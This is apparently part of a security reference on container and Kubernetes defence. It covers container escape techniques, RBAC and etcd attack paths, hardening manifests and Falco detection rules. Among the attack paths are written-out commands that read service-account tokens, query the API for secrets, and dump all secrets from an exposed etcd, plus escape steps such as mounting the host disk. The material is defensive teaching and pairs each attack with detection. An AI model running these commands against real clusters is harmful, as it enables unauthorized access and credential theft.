| [Kubernetes Security Best Practices (Liz Rice)](https://www.oreilly.com/library/view/kubernetes-security/9781492039075/) | Book | RBAC, network policies, admission control, and secrets management |
| [KubeCon Security Talks](https://www.youtube.com/@cncf) | Free video | Annual KubeCon talks covering container escapes, supply chain, and eBPF security |
| [Killer.sh CKS Practice](https://killer.sh) | Lab environment | The most realistic CKS exam simulator; scenario-based Kubernetes security labs |
| [Falco Documentation](https://falco.org/docs/) | Reference | CNCF runtime security engine; rule writing and deployment guides |

---


---

## Container Escape Techniques (Structured Reference)

### Common Container Escape Methods

| Technique | Requires | Method | Detection |
|-----------|----------|--------|-----------|
| Privileged container | `--privileged` flag | Mount host filesystem: `mount /dev/sda1 /mnt`; chroot to host | Alert on privileged container creation; detect /dev/sda mount in container |
| Host PID namespace | `--pid=host` | See host processes; signal host processes; access `/proc/PID/root` | Flag pods with `hostPID: true` |
| Host network namespace | `--net=host` | Bypass network policy; access host network interfaces; listen on host ports | Flag pods with `hostNetwork: true` |
| Writable /proc | Proc filesystem exposed | Write to `/proc/sys/kernel/*` to affect host | Monitor /proc writes from container |
| CAP_SYS_ADMIN | sys_admin capability | Load kernel modules; mount filesystems; various kernel operations | Alert on sys_admin capability grant |
| CAP_NET_ADMIN | net_admin capability | Modify network interfaces; iptables rules | Alert on net_admin without explicit justification |
| Docker socket mount | `/var/run/docker.sock` mounted | Create new privileged container with host mount | Block docker.sock mounts in admission policy |
| CVE exploits | Unpatched container runtime | runc CVE-2019-5736 (container exit overwrites host runc binary) | Patch container runtime; immutable host filesystem |

### Kubernetes Attack Paths

**RBAC Misconfigurations**

- Wildcards in rules: `rules: [{apiGroups: ["*"], resources: ["*"], verbs: ["*"]}]` — full cluster admin
- Dangerous verbs: `create` on pods (deploy malicious pod), `exec` on pods (command execution), `list/get` on secrets (read all secrets)
- Privilege escalation via pod creation: Create pod with `hostPath: /` and `privileged: true` — host access
- Service account token exposure: Default token automounted even when not needed

**Service Account Exploitation**

```bash
# From inside a pod — check mounted service account token
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Use token to query Kubernetes API
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -k -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/secrets

# Check what permissions this service account has
kubectl auth can-i --list --token=$TOKEN
```

**etcd Attack**

- etcd contains all Kubernetes state including secrets (base64 encoded, not encrypted by default)
- Access: If etcd exposed without mTLS (common misconfiguration): `etcdctl get / --prefix --keys-only`
- Extract all secrets: `etcdctl get /registry/secrets/ --prefix`
- Defense: Encrypt etcd at rest; mTLS for etcd; restrict etcd network access to control plane only

**Kubernetes Privilege Escalation Techniques**

- Pod Security Policy bypass (deprecated but still seen): PSP misconfiguration allows privileged pods
- Node compromise via DaemonSet: Create DaemonSet with `hostPID + hostNetwork + privileged` — runs on every node
- Volume mounts: Mount host path with sensitive files (kubeconfig, cloud credentials)
- init containers: Run privileged init container to modify host before main container starts

---

## Kubernetes Hardening (Prescriptive)

### Pod Security Standards (PSS) Enforcement

```yaml
# Label namespace to enforce restricted PSS
apiVersion: v1
kind: Namespace
metadata:
  name: production
  labels:
    pod-security.kubernetes.io/enforce: restricted
    pod-security.kubernetes.io/audit: restricted
    pod-security.kubernetes.io/warn: restricted
```

### Network Policies (Default Deny)

```yaml
# Default deny all ingress and egress
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-all
  namespace: production
spec:
  podSelector: {}
  policyTypes:
  - Ingress
  - Egress
---
# Allow only specific communication
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-frontend-to-backend
spec:
  podSelector:
    matchLabels:
      app: backend
  ingress:
  - from:
    - podSelector:
        matchLabels:
          app: frontend
    ports:
    - port: 8080
```

### Secure Pod Spec Checklist

```yaml
securityContext:
  runAsNonRoot: true
  runAsUser: 10001
  runAsGroup: 10001
  readOnlyRootFilesystem: true
  allowPrivilegeEscalation: false
  seccompProfile:
    type: RuntimeDefault
  capabilities:
    drop:
    - ALL
```

### OPA Gatekeeper Policy Example

```yaml
# Block privileged containers
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sPSPPrivilegedContainer
metadata:
  name: psp-privileged-container
spec:
  match:
    kinds:
    - apiGroups: [""]
      kinds: ["Pod"]
```

### Falco Runtime Detection Rules

```yaml
# Detect container escape attempts
- rule: Container Escape via Privileged Mount
  desc: Detect mounting of host filesystem from container
  condition: >
    container.id != host and
    evt.type = mount and
    fd.name startswith /dev/sd
  output: "Possible container escape via mount (container=%container.name user=%user.name)"
  priority: CRITICAL

# Detect kubectl exec into running pod
- rule: Kubectl exec into pod
  desc: Someone executed a shell in a running pod
  condition: >
    spawned_process and
    container and
    proc.name in (bash, sh, zsh) and
    proc.pname = runc
  output: "Shell spawned in container via exec (user=%user.name container=%container.name)"
  priority: WARNING
```

---

## Container Security Tooling Reference

| Tool | Purpose | OSS? |
|------|---------|------|
| Trivy | Container vuln scanning (OS + app layers) | Yes |
| Grype (Anchore) | Container and filesystem scanning | Yes |
| Falco (CNCF) | Runtime anomaly detection | Yes |
| OPA Gatekeeper | Kubernetes admission policy | Yes |
| Kyverno | Kubernetes-native policy engine | Yes |
| kube-bench | CIS Kubernetes Benchmark assessment | Yes |
| kube-hunter | Kubernetes penetration testing | Yes |
| kubeaudit | Kubernetes security audit | Yes |
| Checkov | IaC scanning (K8s manifests) | Yes |
| Snyk Container | Developer-facing container scanning | Freemium |
| Aqua Security | Full container/K8s security platform | Commercial |
| Sysdig Secure | Falco-based runtime; CNAPP | Commercial |

---

## Related Disciplines

- [Cloud Security](cloud-security.md) — Container and Kubernetes security is a specialization within the broader cloud security discipline; EKS, GKE, and AKS add cloud IAM and managed control plane attack surfaces
- [DevSecOps](devsecops.md) — Image scanning, admission control, and signing belong in CI/CD pipelines; container security is inseparable from DevSecOps pipeline design
- [Supply Chain Security](supply-chain-security.md) — Container image signing, SLSA build provenance, and registry security are core supply chain security concerns
- [Network Security](network-security.md) — Kubernetes NetworkPolicy and service mesh mTLS are the network security layer for containerized workloads
- [Vulnerability Management](vulnerability-management.md) — Container image CVE scanning and base image remediation are a primary vulnerability management workflow in container-heavy environments
